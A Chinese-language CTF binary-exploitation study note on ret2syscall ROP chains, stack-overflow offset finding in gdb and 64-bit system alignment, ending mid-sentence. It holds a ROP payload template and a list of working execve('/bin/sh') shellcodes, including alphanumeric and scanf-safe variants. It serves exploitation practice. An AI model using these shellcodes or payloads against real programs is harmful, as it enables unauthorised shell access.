1.ret2syscall
==

介绍#
-
控制程序执行系统调用，获取 shell

判断#
-
如果没有system和开启了NX（栈不可执行）保护可以用（有system最好用ret2text，方便省事，没开NX直接ret2shellcode）

步骤#
-

32位和64位的syscall原理都是一样，只有传参和调用存在差异，以下一起说，做个对比。<br>

    32位系统调用使用 " int 80h "
    64位系统调用使用 " syscall " （汇编代码就是syscall 直接ROPgadget--only查找即可）
    
32的系统调用号与64位的不大一样 使用的时候最好百度一下

    32位     #define __NR_execve 11
    64位     #define __NR_execve 59   （0x3b）

32位的系统调用号放在eax 传参依次是 **EBX、ECX、EDX、ESI、EDI、EBP**   <br>
64位的系统调用号放在rax 传参依次是 **RDI、RSI、RDX、R10、R8、R9**  （和64位函数传参一样）<br>


构造ROP chain:<br>
①没有/bin/sh字眼 只能自己加到bss区域，然后调用execve("/bin/sh",NULL,NULL)<br>
查找bss：<br>
![image](https://github.com/xhsy0314/Task/assets/84487619/7b7d482f-4c63-46f8-9917-d568ac11ab05)
<br>

②有/bin/sh，溢出成功后，通过寻找特定的寄存器，以寄存器承载特定的数据，构造 execve(“/bin/sh”,NULL,NULL) 的汇编实现，将其部署栈中，劫持控制流实现获取 shell。
<br>
如何构造汇编实现？(64bit)

    execve("/bin/sh",NULL,NULL)
    系统调用号，rax为59
    第一个参数，rdi指向/bin/sh
    第二个参数，为0
    第三个参数，为0
    第四个参数，为0
    第五个参数，rsi为0
    payload = "A"*offset(偏移量) + flat(rdi,bin_sh,rax_rdx_rbx,59,0,0,rsi,0,syscall)

查找各寄存器地址：

```
ROPgadget --binary ret2syscall --only "syscall|ret"
ROPgadget --binary ret2syscall --only 'pop|ret' | grep 'rdx'    #rdx=0x000000000040168b
```

![image](https://github.com/xhsy0314/Task/assets/84487619/6979353a-b56c-4ae4-9739-a244bad2fc38)


2.shellcode
==

shellcode收集：(持续补充)

```
# 32位 短字节shellcode --> 21字节
\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80

# 32位 纯ascii字符shellcode
PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJISZTK1HMIQBSVCX6MU3K9M7CXVOSC3XS0BHVOBBE9RNLIJC62ZH5X5PS0C0FOE22I2NFOSCRHEP0WQCK9KQ8MK0AA

# 32位 scanf可读取的shellcode
\xeb\x1b\x5e\x89\xf3\x89\xf7\x83\xc7\x07\x29\xc0\xaa\x89\xf9\x89\xf0\xab\x89\xfa\x29\xc0\xab\xb0\x08\x04\x03\xcd\x80\xe8\xe0\xff\xff\xff/bin/sh

# 64位 scanf可读取的shellcode 22字节
\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05

# 64位 较短的shellcode  23字节
\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05

# 64位 纯ascii字符shellcode
Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t
```

```
shellcode=""
io.sendline(shellcode)
```

3.system函数参数非/bin/sh (64位)
-

```
__int64 dofunc()
{
  __int64 buf; // [rsp+8h] [rbp-8h] BYREF

  buf = 0LL;
  puts("input:");
  read(0, &buf, 0x100uLL);
  return 0LL;
}
```

buf栈溢出，动态调试计算能够输入的长度:

```
gdb file
b main
r
n    ---步过，直到执行到某个函数
s    ---进入该函数
n    ---直到回车后提示输入数据
随便输入一些数据
stack 24    ---查看栈情况
```

![image](https://github.com/xhsy0314/Task/assets/84487619/87c3d24b-8fa0-4954-8c7b-2d581f2feb08)<br>

rbp-rsi之间就是buf中能够输入数据的长度，也是填充数据的长度，这里是0x10-0x8=8.<br>
然后还需要填充8个字节的数据，因为rbp占8个字节。也就是一共填充16个垃圾数据。<br>

易忽略的点：**64位程序中的system函数的栈对齐问题**

1、将system函数地址+1，此处的+1，即是把地址+1，也可以理解为


